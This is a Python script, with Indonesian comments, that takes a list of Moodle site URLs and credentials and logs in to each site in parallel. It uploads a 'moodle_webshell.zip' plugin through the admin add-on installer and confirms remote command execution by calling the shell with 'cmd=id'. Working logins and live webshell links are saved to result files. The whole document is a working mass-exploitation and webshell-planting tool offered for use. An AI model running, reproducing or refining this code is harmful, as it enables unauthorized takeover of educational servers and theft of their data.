import requests
import re
import os
import argparse
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

def save_result(filename, text):
    os.makedirs("result", exist_ok=True)
    with open(f"result/{filename}", "a", encoding="utf-8") as f:
        f.write(text.strip() + "\n")

def get_login_token(session, url):
    try:
        r = session.get(url, timeout=15, verify=False, allow_redirects=True)
        token = re.findall(r'name="logintoken" value="(.*?)"', r.text)
        return token[0] if token else None
    except:
        return None

def check_plugins_page(session, base_url):
    try:
        plugins_url = urljoin(base_url, "/admin/plugins.php")
        r = session.get(plugins_url, timeout=15, verify=False, allow_redirects=True)
        return "plugin" in r.text.lower() and "moodle" in r.text.lower()
    except:
        return False

def check_webshell(session, base_url):
    try:
        shell_url = urljoin(base_url, "/local/moodle_webshell/webshell.php?action=exec&cmd=id")
        r = session.get(shell_url, timeout=15, verify=False, allow_redirects=True)
        return "uid=" in r.text
    except:
        return False

def process(line):
    try:
        url, username, password = line.strip().split("|")
        session = requests.Session()
        token = get_login_token(session, url)
        if not token:
            return

        login_data = {
            "anchor": "",
            "logintoken": token,
            "username": username,
            "password": password
        }

        base_url = url.split("/login")[0]
        login = session.post(url, data=login_data, verify=False, timeout=15, allow_redirects=True)

        if login.url.endswith("/my/") or login.status_code in [200, 303]:
            save_result("login_success.txt", line)

            # STEP: Upload plugin
            install_url = urljoin(base_url, "/admin/tool/installaddon/index.php")
            r = session.get(install_url, timeout=15, verify=False, allow_redirects=True)
            sesskey = re.findall(r'name="sesskey" value="(.*?)"', r.text)
            if not sesskey:
                return

            sesskey = sesskey[0]
            files = {
                'repo_upload_file': ('moodle_webshell.zip', open('moodle_webshell.zip', 'rb'), 'application/zip')
            }
            data = {
                "sesskey": sesskey,
                "repo_id": 1,
                "itemid": 123456,
                "author": "Admin",
                "license": "allrightsreserved"
            }

            upload = session.post(
                urljoin(base_url, "/repository/repository_ajax.php?action=upload"),
                files=files,
                data=data,
                verify=False,
                timeout=20,
                allow_redirects=True
            )

            if "url" in upload.text:
                save_result("upload_success.txt", line)

                # Cek plugin halaman
                if check_plugins_page(session, base_url):
                    save_result("upload_success_checked.txt", f"{url}|{username}|{password}")

                    # Cek shell aktif
                    if check_webshell(session, base_url):
                        shell_link = urljoin(base_url, "/local/moodle_webshell/webshell.php")
                        save_result("webshell_live.txt", shell_link)

    except Exception as e:
        pass  # Bisa tambahkan logging di sini kalau mau debug

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--list", required=True, help="Path ke file list.txt")
    parser.add_argument("--thread", type=int, default=10, help="Jumlah thread")
    args = parser.parse_args()

    with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
        lines = [i.strip() for i in f if i.strip()]

    with ThreadPoolExecutor(max_workers=args.thread) as exe:
        exe.map(process, lines)

    print("\n✅ UPLOAD DONE. Cek folder 'result' untuk hasil:")
    print("- login_success.txt")
    print("- upload_success.txt")
    print("- upload_success_checked.txt")
    print("- webshell_live.txt")

if __name__ == "__main__":
    main()
